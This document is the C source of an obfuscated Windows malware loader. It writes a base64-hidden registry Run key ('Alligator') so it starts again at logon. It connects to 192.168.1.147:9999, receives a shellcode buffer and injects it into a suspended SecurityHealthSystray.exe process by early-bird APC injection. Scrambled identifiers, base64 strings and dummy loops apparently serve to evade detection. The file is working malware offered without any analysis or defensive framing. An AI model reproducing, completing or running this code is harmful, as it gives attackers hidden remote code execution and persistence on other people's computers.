#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "base64.h"

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

#define A "192.168.1.147" 
#define B 9999
#define C 1024
#define D 512

void dasbjkdfbasjkfbjkasfgjlafl() {
    char asjioasfod[MAX_PATH];
    wchar_t askdnawisodn9[C];
    char oaoaoapspd[D];

    if (!GetModuleFileNameW(NULL, askdnawisodn9, C)) {
        printf("%s", base64_decode("RXJyb3IgOiBGYWlsZWQgdG8gZ2V0IGN1cnJlbnQgZXhlY3V0YWJsZSBmaWxlIHBhdGguXG4="));
        return;
    }

    wcstombs(asjioasfod, askdnawisodn9, MAX_PATH);

    char* base64_cm = "cmVnIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBBbGxpZ2F0b3IgL2QgIiVzIiAvZg==";
    sprintf(oaoaoapspd, base64_decode(base64_cm), asjioasfod);

    system(oaoaoapspd);
}

int main() {
    WSADATA wese;
    SOCKET g;
    struct sockaddr_in k;
    unsigned char x[C];
    int p;

    dasbjkdfbasjkfbjkasfgjlafl();

    if (WSAStartup(MAKEWORD(2, 2), &wese) != 0) {
        printf("%s", base64_decode("RXJyb3IgZW4gV1NBU3RhcnR1cFxu"));
        return 1;
    }

    int a = 5;
    if ((a * a + a) % 2 == 1) {
        printf("%s", base64_decode("RXN0byBudW5jYSBzZSBpbXByaW1pcsOhXG4="));
    }

    if ((g = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("%s %d\n", base64_decode("Tm8gc2UgcHVkbyBjcmVhciBlbCBzb2NrZXQ6"), WSAGetLastError());
        WSACleanup();
        return 1;
    }

    k.sin_family = AF_INET;
    k.sin_port = htons(B);

    k.sin_addr.s_addr = inet_addr(A);
    if (k.sin_addr.s_addr == INADDR_NONE) {
        printf("%s", base64_decode("RXJyb3IgYWwgY29udmVydGlyIGxhIGRpcmVjY2lvbiBJUFxu"));
        closesocket(g);
        WSACleanup();
        return 1;
    }

    for (int i = 0; i < 50; i++) {
        int dummy = i + 1;
    }

    if (connect(g, (struct sockaddr*)&k, sizeof(k)) < 0) {
        printf("%s", base64_decode("RmFsbG8gZW4gbGEgY29uZXhpb25cbg=="));
        closesocket(g);
        WSACleanup();
        return 1;
    }

    p = recv(g, x, C, 0);
    if (p == SOCKET_ERROR) {
        printf("%s %d\n", base64_decode("RXJyb3IgYWwgcmVjaWJpciBkYXRvczo="), WSAGetLastError());
        closesocket(g);
        WSACleanup();
        return 1;
    }

    for (int i = 0; i < 30; i++) {
        int dummy = i * 3;
    }
    
    SIZE_T rs = sizeof(x);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    CreateProcessA(base64_decode("QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxTZWN1cml0eUhlYWx0aFN5c3RyYXkuZXhl"), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE vp = pi.hProcess;
    HANDLE tt = pi.hThread;

    LPVOID sa = VirtualAllocEx(vp, NULL, rs, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE ae = (PTHREAD_START_ROUTINE)sa;

    WriteProcessMemory(vp, sa, x, rs, NULL);
    QueueUserAPC((PAPCFUNC)ae, tt, NULL);
    ResumeThread(tt);

    closesocket(g);
    WSACleanup();

    return 0;
}
